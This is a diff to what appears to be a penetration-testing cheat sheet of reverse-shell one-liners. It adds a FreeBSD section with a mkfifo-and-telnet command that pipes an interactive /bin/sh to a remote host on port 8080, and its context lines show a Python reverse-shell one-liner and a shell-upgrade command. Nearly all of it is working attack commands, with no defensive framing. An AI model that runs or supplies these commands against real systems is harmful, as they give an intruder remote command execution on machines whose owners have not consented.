@@ -46,6 +46,10 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ```bash
 /usr/bin/script -qc /bin/bash /dev/null
 ```
-
+## *FreeBSD*
+### Reverse shell
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet 172.18.0.2 8080 > /tmp/f
+```
 
 
